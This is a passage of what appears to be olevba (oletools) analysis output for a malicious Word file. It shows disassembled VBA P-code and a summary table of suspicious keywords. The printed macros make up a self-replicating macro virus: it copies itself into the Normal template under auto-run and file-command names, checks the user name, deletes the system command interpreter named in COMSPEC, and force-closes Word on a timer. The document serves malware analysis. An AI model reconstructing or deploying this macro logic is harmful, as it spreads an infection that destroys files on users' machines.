' 	LitDI2 0x0001 
' 	Add 
' 	St Hours 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld Hours 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Hours 
' 	EndIf 
' Line #30:
' 	Ld Hours 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Minutes 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	St Alarm$ 
' Line #31:
' 	Ld Alarm$ 
' 	LitStr 0x0006 "WordDE"
' 	Ld WordBasic 
' 	ArgsMemCall OnTime 0x0002 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	EndSub 
' Macros/VBA/WordSU - 4489 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Counter
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn Macro
' Line #5:
' 	Dim 
' 	VarDefn bWordSU
' Line #6:
' 	Dim 
' 	VarDefn bFileOpen
' Line #7:
' 	Dim 
' 	VarDefn bFilePrint
' Line #8:
' 	Dim 
' 	VarDefn bFileSaveAs
' Line #9:
' 	Dim 
' 	VarDefn bAutoExec
' Line #10:
' 	Dim 
' 	VarDefn bWordDE
' Line #11:
' 	Dim 
' 	VarDefn MacroFile
' Line #12:
' 	Dim 
' 	VarDefn lox (As Object)
' Line #13:
' 	Dim 
' 	VarDefn Id
' Line #14:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim Lox___$ 0x0001 (As String)
' Line #15:
' 	Dim 
' 	VarDefn Gay
' Line #16:
' 	Dim 
' 	VarDefn A
' Line #17:
' 	Dim 
' 	VarDefn Comspec
' Line #18:
' Line #19:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0003 
' 	St Counter 
' Line #20:
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #22:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	St Macro$ 
' Line #23:
' 	Ld Macro$ 
' 	LitStr 0x0006 "WordSU"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bWordSU 
' 	EndIf 
' Line #24:
' 	Ld Macro$ 
' 	LitStr 0x0008 "FileOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFileOpen 
' 	EndIf 
' Line #25:
' 	Ld Macro$ 
' 	LitStr 0x0009 "FilePrint"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFilePrint 
' 	EndIf 
' Line #26:
' 	Ld Macro$ 
' 	LitStr 0x000A "FileSaveAs"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bFileSaveAs 
' 	EndIf 
' Line #27:
' 	Ld Macro$ 
' 	LitStr 0x0008 "AutoExec"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bAutoExec 
' 	EndIf 
' Line #28:
' 	Ld Macro$ 
' 	LitStr 0x0006 "WordDE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St bWordDE 
' 	EndIf 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' Line #31:
' 	Ld bWordSU 
' 	Ld bFileOpen 
' 	And 
' 	Ld bFilePrint 
' 	And 
' 	Ld bFileSaveAs 
' 	And 
' 	Ld bAutoExec 
' 	And 
' 	Ld bWordDE 
' 	And 
' 	IfBlock 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MacroFile$ 
' Line #34:
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000D "Normal:WordSU"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #35:
' 	Ld MacroFile$ 
' 	LitStr 0x000A ":FilePrint"
' 	Add 
' 	LitStr 0x0010 "Normal:FilePrint"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #36:
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":FileOpen"
' 	Add 
' 	LitStr 0x000F "Normal:FileOpen"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #37:
' 	Ld MacroFile$ 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitStr 0x000F "Normal:AutoExec"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #38:
' 	Ld MacroFile$ 
' 	LitStr 0x0007 ":WordDE"
' 	Add 
' 	LitStr 0x000D "Normal:WordDE"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #39:
' 	Ld MacroFile$ 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitStr 0x0011 "Normal:FileSaveAs"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #40:
' Line #41:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd HelpAbout 0x0001 
' 	Set lox 
' Line #42:
' 	Ld lox 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall HelpAbout 0x0001 
' Line #43:
' 	Ld lox 
' 	MemLd APPUSERNAME 
' 	ArgsLd LCase 0x0001 
' 	St Id$ 
' Line #44:
' 	OptionBase 
' 	LitDI2 0x0005 
' 	Redim Lox___$ 0x0001 (As String)
' Line #45:
' 	LitStr 0x0003 "386"
' 	LitDI2 0x0000 
' 	ArgsSt Lox___$ 0x0001 
' Line #46:
' 	LitStr 0x0003 "gay"
' 	LitDI2 0x0001 
' 	ArgsSt Lox___$ 0x0001 
' Line #47:
' 	LitStr 0x0003 "gaj"
' 	LitDI2 0x0002 
' 	ArgsSt Lox___$ 0x0001 
' Line #48:
' 	LitStr 0x0003 "ãàÿ"
' 	LitDI2 0x0003 
' 	ArgsSt Lox___$ 0x0001 
' Line #49:
' 	LitStr 0x0003 "rus"
' 	LitDI2 0x0004 
' 	ArgsSt Lox___$ 0x0001 
' Line #50:
' Line #51:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0004 
' 	For 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld Id$ 
' 	Ld i 
' 	ArgsLd Lox___$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Gay 
' 	EndIf 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' Line #55:
' 	Ld Gay 
' 	IfBlock 
' Line #56:
' 	LitStr 0x0003 "gay"
' 	LitStr 0x0003 "lox"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St Id$ 
' Line #57:
' 	Ld Id$ 
' 	FnLen 
' 	SelectCase 
' Line #58:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #59:
' 	LitStr 0x0003 "gay"
' 	LitStr 0x0003 "lox"
' 	LitStr 0x0001 "1"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #60:
' 	LitStr 0x001B "Initiating StartUp Sequence"
' 	LitStr 0x000B "WordSU Info"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #61:
' 	LitDI2 0x0005 
' 	CaseLt 
' 	CaseDone 
' Line #62:
' 	Ld Id$ 
' 	LitStr 0x0001 "1"
' 	Add 
' 	St A$ 
' Line #63:
' 	LitStr 0x0003 "gay"
' 	LitStr 0x0003 "lox"
' 	Ld A$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #64:
' 	CaseElse 
' Line #65:
' 	LitStr 0x0003 "gay"
' 	LitStr 0x0003 "lox"
' 	LitStr 0x0001 "1"
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #66:
' 	LitStr 0x0007 "COMSPEC"
' 	ArgsLd Environ 0x0001 
' 	St Comspec$ 
' Line #67:
' 	Ld Comspec$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #68:
' 	Ld Comspec$ 
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #69:
' 	EndSelect 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndSub 
' Macros/VBA/WordDE - 866 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0001 
' Line #3:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

